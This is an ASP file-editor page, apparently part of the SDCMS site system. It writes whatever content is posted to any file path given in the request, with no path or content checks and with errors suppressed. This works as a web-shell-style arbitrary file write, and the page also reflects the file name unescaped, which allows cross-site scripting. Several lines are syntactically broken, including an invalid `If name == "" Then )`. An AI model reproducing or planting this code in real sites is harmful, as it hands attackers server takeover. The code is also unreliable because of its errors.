<!--#include file="sdcms_check.asp"-->
<%
	On Error Resume Next	'-----------Error

	Dim fname
	fname = getcvalue("f")
	If fname="" Then 
		fname = Request.QueryString
	End If
	If fname="" Then
		Response.write("Error! 非法提交!");
		Response.end
	End If
	Response.write(fname)
	dim content
		content=Trim(Request.Form("content"))
	If request("action")="Edit" Then
		Set Fso = Server.CreateObject("Scripting.FileSystemObject")
		Filen=Server.MapPath(fname)
		Set Site_Config=FSO.CreateTextFile(Filen,true, False)
		Site_Config.Write content
		Site_Config.Close
		Set Fso = Nothing
		Response.Write("<script>alert('\u4fee\u6539\u6210\u529f!');</script>")
	End If
	
	Function getcvalue(name)
		If name == "" Then  ) 
			getcvalue = ""
			Exit Function
		End If
		If Request.Form(name)<>"" Then 
			getcvalue = Request.Form(name)
			Exit Function
		End If
		If Request.QueryString(name)<>"" Then 
			getcvalue = Request.QueryString(name)
			Exit Function
		End If
		getcvalue = ""
	End Function



	Response.end
%>
<html>
<head>
<title>file</title>
</head>
<body>
<form method="post" action="?Action=Edit">
<input name="f" value="<%=fname%>" />
<textarea name="content" class="textinput" style="width:800px;height:200px;"><!--#include file="<%=fname%>"--></textarea>
<BR>
<input type="submit" name="Submit" class="submit" value="提交更新">
</form>
</body>
</html>
<%
		if Err.Number<>0 Then
			Response.write("Error: ["&Err.Number&"]  "&Err.Description&" ["&Err.Source&"] ")
			Err.Clear
		end If
%>